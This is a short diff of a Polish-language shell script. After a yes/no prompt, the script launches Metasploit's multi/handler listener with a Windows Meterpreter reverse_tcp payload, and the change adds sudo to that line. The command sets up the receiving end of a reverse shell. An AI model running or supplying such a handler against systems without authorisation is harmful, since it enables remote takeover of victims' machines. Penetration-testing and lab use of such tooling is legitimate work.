@@ -28,7 +28,7 @@ if [ $ODPOWIEDZ == "Y" ]
 then
   echo "Uruchamiam skrypt... "
   sleep 3
-  msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp'
+  sudo msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp'
 else
   echo "Kończę działanie skryptu ..."
 fi
